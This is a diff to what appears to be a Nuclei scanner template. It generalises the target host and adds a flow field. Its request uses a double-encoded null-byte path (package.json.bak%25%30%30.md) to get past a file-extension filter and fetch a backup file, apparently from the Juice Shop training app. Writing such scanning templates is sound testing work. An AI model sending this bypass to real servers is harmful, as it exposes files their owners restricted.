@@ -5,12 +5,15 @@ info:
   author: your_name
   severity: info
   description: 
+  
+flow: |
+  http(1)
 
 requests:
   - raw:
       - |
         GET /ftp/package.json.bak%25%30%30.md HTTP/1.1
-        Host: 127.0.0.1:3000
+        Host: {{Hostname}}
         
     matchers:
       - type: status
